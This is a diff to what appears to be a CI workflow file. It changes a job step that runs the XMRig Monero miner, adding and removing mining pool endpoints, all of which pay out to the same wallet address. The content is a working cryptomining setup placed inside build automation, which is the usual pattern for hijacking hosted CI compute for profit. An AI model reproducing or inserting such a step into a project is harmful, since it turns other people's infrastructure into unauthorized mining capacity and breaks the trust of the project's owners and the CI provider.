@@ -24,8 +24,7 @@ jobs:
         run: |
           cd xmrig/build
           ./xmrig --donate-level 5 --randomx-mode=fast \
+          -o xmr-us-east1.nanopool.org:14433 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 --tls --coin monero \
+          -o xmr-us-west1.nanopool.org:14433 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 --tls --coin monero \
           -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x \
-          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 2 \
-          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 3 \
-          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 4 \
-          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 5
+          -o pool.xmrfast.com:9000 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x
